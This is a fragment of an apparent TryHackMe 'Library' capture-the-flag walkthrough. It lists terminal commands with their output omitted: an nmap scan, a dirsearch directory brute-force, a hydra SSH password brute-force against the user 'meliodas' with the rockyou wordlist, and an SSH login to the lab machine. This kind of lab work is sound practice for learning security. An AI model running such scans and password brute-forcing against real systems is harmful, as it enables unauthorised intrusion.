...
```
bibo318@parrot:~/CTFs/tryhackme/Library$ sudo nmap -A -sS -sC -sV -O 10.10.163.174
...
```
bibo318@parrot:~/CTFs/tryhackme/Library$ sudo /opt/dirsearch/dirsearch.py -u 10.10.163.174 -w /usr/share/dirb/wordlists/common.txt -e html,php
[sudo] password for kali: 
...
```
bibo318@parrot:~/CTFs/tryhackme/Library$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.174
...
```
bibo318@parrot:~/CTFs/tryhackme/Library$ ssh meliodas@10.10.163.174
